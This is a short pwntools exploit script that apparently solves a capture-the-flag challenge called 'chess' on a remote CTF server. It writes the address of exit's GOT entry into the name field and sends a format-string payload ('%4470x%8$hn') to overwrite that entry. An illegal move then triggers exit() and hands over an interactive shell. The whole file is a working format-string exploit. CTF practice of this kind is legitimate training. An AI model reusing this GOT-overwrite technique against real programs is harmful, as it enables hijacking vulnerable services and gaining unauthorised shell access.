from pwn import *

binary = context.binary = ELF('./chess')

p = remote('challenges.ctfd.io', 30458)
#p = process(binary.path)

# "\x68\x40\x40A\x00\x00\x00\x00\x00" is p64(binary.sym.got.exit)
p.sendline("1")
p.sendlineafter("Enter your name", "\x68\x40\x40A\x00\x00\x00\x00\x00B")

# send payload format string
p.sendlineafter("h1", b"Ra1 %4470x%8$hn")

# send wrong step move to call got.exit()
p.sendlineafter("- Qg7", "Qg8")

# maintain shell
p.interactive()